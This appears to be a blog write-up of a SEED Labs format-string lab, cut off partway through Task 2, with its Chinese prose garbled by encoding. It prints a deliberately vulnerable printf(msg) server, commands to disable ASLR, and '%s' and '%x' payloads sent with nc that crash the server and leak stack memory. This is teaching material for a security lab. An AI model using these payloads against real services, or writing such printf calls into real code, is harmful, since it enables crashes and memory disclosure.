    <url>/p/df8f6639/</url>
    
    <content type="html"><![CDATA[<h1 id="Environment-Setup"><a href="#Environment-Setup" class="headerlink" title="Environment Setup"></a>Environment Setup</h1><p>ç°ä»£æ“ä½œç³»ç»Ÿä½¿ç”¨åœ°å€ç©ºé—´éšæœºåŒ–ï¼ˆASLRï¼‰æ¥éšæœºåŒ–å †å’Œå †æ ˆçš„èµ·å§‹åœ°å€ã€‚è¿™ä½¿å¾—çŒœæµ‹ç¡®åˆ‡çš„åœ°å€å˜å¾—å›°éš¾; çŒœæµ‹åœ°å€æ˜¯æ ¼å¼å­—ç¬¦ä¸²æ”»å‡»çš„å…³é”®æ­¥éª¤ä¹‹ä¸€ã€‚ä¸ºäº†ç®€åŒ–è¿™ä¸ªlabï¼Œæˆ‘ä»¬ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å…³é—­åœ°å€éšæœºåŒ–:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ sudo sysctl -w kernel.<span class="hljs-attribute">randomize_va_space</span>=0<br></code></pre></td></tr></table></figure><h1 id="The-Vulnerable-Program"><a href="#The-Vulnerable-Program" class="headerlink" title="The Vulnerable Program"></a>The Vulnerable Program</h1><p>åœ¨server-codeç›®å½•æ‰§è¡Œ</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-built_in">make</span> <br><span class="hljs-built_in">make</span> install <br></code></pre></td></tr></table></figure><p>æœåŠ¡å™¨è¿è¡Œåœ¨10.9.0.5ä¸Šï¼Œå®ƒè¿è¡Œä¸€ä¸ªå¸¦æœ‰æ ¼å¼å­—ç¬¦ä¸²æ¼æ´çš„32ä½ç¨‹åº</p><p>åœ¨Labsetupæ–‡ä»¶å¤¹æ‰§è¡Œ</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">docker-compose <span class="hljs-keyword">build </span><span class="hljs-comment"># Build the container image</span><br>docker-compose up <span class="hljs-comment"># Start the container</span><br></code></pre></td></tr></table></figure><p>å›æ˜¾</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">Starting</span> server-<span class="hljs-number">10.9.0.6</span> ... done<br>Attaching to server-<span class="hljs-number">10.9.0.5</span>, server-<span class="hljs-number">10.9.0.6</span><br></code></pre></td></tr></table></figure><p>åœ¨å®¹å™¨ä¸­è¿è¡Œshell</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">[03/<span class="hljs-number">27</span>/<span class="hljs-number">23</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/</span>.../Labsetup<span class="hljs-variable">$ </span>dockps<br>e17efb105f7d  server<span class="hljs-number">-10.9</span>.0.<span class="hljs-number">6</span><br><span class="hljs-number">1874</span>c8677f7a  server<span class="hljs-number">-10.9</span>.0.<span class="hljs-number">5</span><br>[03/<span class="hljs-number">27</span>/<span class="hljs-number">23</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/</span>.../Labsetup<span class="hljs-variable">$ </span>docksh e17<br>root<span class="hljs-variable">@e17efb105f7d</span><span class="hljs-symbol">:/fmt</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>æœåŠ¡å™¨æ¥å—æœ€å¤š1500å­—èŠ‚çš„æ•°æ®ã€‚è¿™ä¸ªlabä¸­çš„ä¸»è¦å·¥ä½œæ˜¯æ„å»ºä¸åŒçš„æœ‰æ•ˆè½½è·ï¼Œä»¥åˆ©ç”¨æœåŠ¡å™¨ä¸­çš„æ ¼å¼å­—ç¬¦ä¸²æ¼æ´ï¼Œè¿™æ ·å°±å¯ä»¥å®ç°æ¯ä¸ªä»»åŠ¡ä¸­æŒ‡å®šçš„ç›®æ ‡ã€‚å¦‚æœå°†æœ‰æ•ˆè´Ÿè½½ä¿å­˜åœ¨æ–‡ä»¶ä¸­ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å°†æœ‰æ•ˆè´Ÿè½½å‘é€åˆ°æœåŠ¡å™¨ã€‚</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> cat &lt;<span class="hljs-keyword">file</span>&gt; | nc <span class="hljs-number">10.9</span><span class="hljs-number">.0</span><span class="hljs-number">.5</span> <span class="hljs-number">9090</span><br></code></pre></td></tr></table></figure><p>æ˜“å—æ”»å‡»çš„ç¨‹åºformat. c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;netinet/ip.h&gt;</span></span><br><br><span class="hljs-comment">/* Changing this size will change the layout of the stack.</span><br><span class="hljs-comment"> * Instructors can change this value each year, so students</span><br><span class="hljs-comment"> * won&#x27;t be able to use the solutions from the past.</span><br><span class="hljs-comment"> * Suggested value: between 10 and 400  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> BUF_SIZE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BUF_SIZE 100</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> __x86_64__</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> target = <span class="hljs-number">0x1122334455667788</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>  target = <span class="hljs-number">0x11223344</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> </span><br><br><span class="hljs-keyword">char</span> *secret = <span class="hljs-string">&quot;A secret message\n&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dummy_function</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">myprintf</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *msg)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> __x86_64__</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">int</span> *framep;<br>    <span class="hljs-comment">// Save the rbp value into framep</span><br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;movq %%rbp, %0&quot;</span> : <span class="hljs-string">&quot;=r&quot;</span> (framep));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Frame Pointer (inside myprintf):      0x%.16lx\n&quot;</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) framep);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The target variable&#x27;s value (before): 0x%.16lx\n&quot;</span>, target);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *framep;<br>    <span class="hljs-comment">// Save the ebp value into framep</span><br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;movl %%ebp, %0&quot;</span> : <span class="hljs-string">&quot;=r&quot;</span>(framep));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Frame Pointer (inside myprintf):      0x%.8x\n&quot;</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>) framep);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The target variable&#x27;s value (before): 0x%.8x\n&quot;</span>,   target);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br>    <span class="hljs-comment">// This line has a format-string vulnerability</span><br>    <span class="hljs-built_in">printf</span>(msg);<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> __x86_64__</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The target variable&#x27;s value (after):  0x%.16lx\n&quot;</span>, target);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The target variable&#x27;s value (after):  0x%.8x\n&quot;</span>,   target);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">1500</span>];<br><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> __x86_64__</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The input buffer&#x27;s address:    0x%.16lx\n&quot;</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The secret message&#x27;s address:  0x%.16lx\n&quot;</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) secret);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The target variable&#x27;s address: 0x%.16lx\n&quot;</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) &amp;target);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The input buffer&#x27;s address:    0x%.8x\n&quot;</span>,   (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)  buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The secret message&#x27;s address:  0x%.8x\n&quot;</span>,   (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)  secret);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The target variable&#x27;s address: 0x%.8x\n&quot;</span>,   (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)  &amp;target);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Waiting for user input ......\n&quot;</span>); <br>    <span class="hljs-keyword">int</span> length = fread(buf, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>), <span class="hljs-number">1500</span>, <span class="hljs-built_in">stdin</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Received %d bytes.\n&quot;</span>, length);<br><br>    dummy_function(buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(^_^)(^_^)  Returned properly (^_^)(^_^)\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// This function is used to insert a stack frame between main and myprintf.</span><br><span class="hljs-comment">// The size of the frame can be adjusted at the compilation time. </span><br><span class="hljs-comment">// The function itself does not do anything.</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dummy_function</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> dummy_buffer[BUF_SIZE];<br>    <span class="hljs-built_in">memset</span>(dummy_buffer, <span class="hljs-number">0</span>, BUF_SIZE);<br><br>    myprintf(str);<br>&#125;<br></code></pre></td></tr></table></figure><p>32ä½ç®€ç•¥ç‰ˆæœ¬ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;netinet/ip.h&gt;</span></span><br><br><span class="hljs-comment">/* Changing this size will change the layout of the stack.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> BUF_SIZE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BUF_SIZE 100</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>  target = <span class="hljs-number">0x11223344</span>;<br><br><span class="hljs-keyword">char</span> *secret = <span class="hljs-string">&quot;A secret message\n&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">myprintf</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *framep;<br>    <span class="hljs-comment">// Save the ebp value into framep</span><br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;movl %%ebp, %0&quot;</span> : <span class="hljs-string">&quot;=r&quot;</span>(framep));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Frame Pointer (inside myprintf):      0x%.8x\n&quot;</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>) framep);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The target variable&#x27;s value (before): 0x%.8x\n&quot;</span>,   target);<br>    <span class="hljs-built_in">printf</span>(msg);<span class="hljs-comment">// This line has a format-string vulnerability</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The target variable&#x27;s value (after):  0x%.8x\n&quot;</span>,   target);<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">1500</span>];<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The input buffer&#x27;s address:    0x%.8x\n&quot;</span>,   (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)  buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The secret message&#x27;s address:  0x%.8x\n&quot;</span>,   (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)  secret);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The target variable&#x27;s address: 0x%.8x\n&quot;</span>,   (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)  &amp;target);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Waiting for user input ......\n&quot;</span>); <br>    <span class="hljs-keyword">int</span> length = fread(buf, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>), <span class="hljs-number">1500</span>, <span class="hljs-built_in">stdin</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Received %d bytes.\n&quot;</span>, length);<br><br>    dummy_function(buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(^_^)(^_^)  Returned properly (^_^)(^_^)\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dummy_function</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> dummy_buffer[BUF_SIZE];<br>    <span class="hljs-built_in">memset</span>(dummy_buffer, <span class="hljs-number">0</span>, BUF_SIZE);<br><br>    myprintf(str);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Task-1-Crashing-the-Program"><a href="#Task-1-Crashing-the-Program" class="headerlink" title="Task 1: Crashing the Program"></a>Task 1: Crashing the Program</h1><p>å‘æœåŠ¡å™¨æä¾›ä¸€ä¸ªè¾“å…¥ï¼Œè¿™æ ·å½“æœåŠ¡å™¨ç¨‹åºè¯•å›¾æ‰“å° myprintf ()å‡½æ•°ä¸­çš„ç”¨æˆ·è¾“å…¥æ—¶ï¼Œå®ƒå°±ä¼šå´©æºƒ</p><p>è¿™æ˜¯æ­£å¸¸çš„è¾“å‡ºï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | Got a connection from <span class="hljs-number">10.9.0.1</span><br><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | Starting format<br><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | The input buffer&#x27;s address:    <span class="hljs-number">0</span>xffffd<span class="hljs-number">300</span><br><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | The secret message&#x27;s address:  <span class="hljs-number">0</span>x<span class="hljs-number">080</span>b<span class="hljs-number">4008</span><br><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | The target variable&#x27;s address: <span class="hljs-number">0</span>x<span class="hljs-number">080</span>e<span class="hljs-number">5068</span><br><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | Waiting for user input ......<br><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | Received <span class="hljs-number">6</span> bytes.<br><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | Frame Pointer (inside myprintf):      <span class="hljs-number">0</span>xffffd<span class="hljs-number">228</span><br><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | The target variable&#x27;s value (before): <span class="hljs-number">0</span>x<span class="hljs-number">11223344</span><br><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | hello<br><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | The target variable&#x27;s value (after):  <span class="hljs-number">0</span>x<span class="hljs-number">11223344</span><br><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | (^_^)(^_^)  Returned properly (^_^)(^_^)<br></code></pre></td></tr></table></figure><p>ä¸ºäº†ä½¿ç¨‹åºå´©æºƒï¼Œåªéœ€è¦è¾“å…¥<code>%s%s%s%s%s%s%s%s%s</code>å³å¯ï¼Œæ€»ä¼šæœ‰æŒ‡é’ˆè®¿é—®åˆ°ä¸å¯è®¿é—®çš„å†…å­˜</p><p>crashæˆåŠŸçš„æ ‡å¿—æ˜¯ä¸æ˜¾ç¤º <code>(_)(_)  Returned properly (_)(_)</code></p><h1 id="Task-2-Printing-Out-the-Server-Programâ€™s-Memory"><a href="#Task-2-Printing-Out-the-Server-Programâ€™s-Memory" class="headerlink" title="Task 2: Printing Out the Server Programâ€™s Memory"></a>Task 2: Printing Out the Server Programâ€™s Memory</h1><h2 id="Task-2-A-Stack-Data"><a href="#Task-2-A-Stack-Data" class="headerlink" title="Task 2.A: Stack Data"></a>Task 2.A: Stack Data</h2><p>æ‰“å°å‡ºå †æ ˆä¸Šçš„æ•°æ®ã€‚éœ€è¦å¤šå°‘% x æ ¼å¼è¯´æ˜ç¬¦æ‰èƒ½è®©æœåŠ¡å™¨ç¨‹åºæ‰“å°è¾“å…¥çš„å‰å››ä¸ªå­—èŠ‚</p><blockquote><p>Difference between %p and %x in C/C++</p><p>The %p is used to print the pointer value, and %x is <strong>used to print hexadecimal values</strong>. Though pointers can also be displayed using %u, or %x.</p></blockquote><p>è¾“å…¥</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">$ echo AAAA_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span> | nc <span class="hljs-number">10.9</span><span class="hljs-number">.0</span><span class="hljs-number">.5</span> <span class="hljs-number">9090</span><br></code></pre></td></tr></table></figure><p>å›æ˜¾</p> <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | AAAA_<span class="hljs-number">11223344</span>_<span class="hljs-number">1000</span>_<span class="hljs-number">8049</span>db<span class="hljs-number">5</span>_<span class="hljs-number">80</span>e<span class="hljs-number">5320</span>_<span class="hljs-number">80</span>e<span class="hljs-number">61</span>c<span class="hljs-number">0</span>_ffffd<span class="hljs-number">300</span>_ffffd<span class="hljs-number">228</span>_<span class="hljs-number">80</span>e<span class="hljs-number">62</span>d<span class="hljs-number">4</span>_<span class="hljs-number">80</span>e<span class="hljs-number">5000</span>_ffffd<span class="hljs-number">2</span>c<span class="hljs-number">8</span>_<span class="hljs-number">8049</span>f<span class="hljs-number">7</span>e_ffffd<span class="hljs-number">300</span>_<span class="hljs-number">0</span>_<span class="hljs-number">64</span>_<span class="hljs-number">8049</span>f<span class="hljs-number">47</span>_<span class="hljs-number">80</span>e<span class="hljs-number">5320</span>_<span class="hljs-number">4</span>ff_ffffd<span class="hljs-number">3</span>dd_ffffd<span class="hljs-number">300</span>_<span class="hljs-number">80</span>e<span class="hljs-number">5320</span>_<span class="hljs-number">80</span>e<span class="hljs-number">9720</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_e<span class="hljs-number">2</span>fa<span class="hljs-number">4</span>d<span class="hljs-number">00</span>_<span class="hljs-number">80</span>e<span class="hljs-number">5000</span>_<span class="hljs-number">80</span>e<span class="hljs-number">5000</span>_ffffd<span class="hljs-number">8</span>e<span class="hljs-number">8</span>_<span class="hljs-number">8049</span>eff_ffffd<span class="hljs-number">300</span>_dd_<span 